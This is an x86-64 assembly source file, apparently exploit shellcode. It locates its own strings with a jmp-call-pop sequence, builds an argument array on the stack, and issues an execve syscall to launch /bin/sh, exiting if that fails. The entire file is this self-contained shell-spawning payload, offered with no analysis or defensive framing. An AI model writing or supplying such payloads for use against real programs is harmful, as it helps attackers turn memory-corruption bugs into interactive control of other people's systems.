#
# Copyright 2014 Joseph Landry
#

.set	SYS_execve,59
.set	SYS_exit,60

.section .text
.global _start

_start:
	jmp	end

begin:
	popq	%r12

build_argv:
	pushq	$0
	mov	%r12,%rax
	jmp	2f

1:
	add	$1,%rax
2:
	cmpb	$0,(%rax)
	jz	continue
	push	%rax
3:
	cmpb	$0,(%rax)
	jz	1b
	add	$1,%rax
	jmp	3b

continue:
	pushq	$0

	mov	%rsp,%rdx
	lea	8(%rsp),%rsi
	mov	(%rsi),%rdi
	mov	$SYS_execve,%rax
	syscall

exit:
	movq	$1,%rdi
	movq	$SYS_exit,%rax
	syscall
	hlt

end:
	call	begin

params:
.ascii "sh\000"
.ascii "-c\000"
.ascii "/bin/sh\000\000"
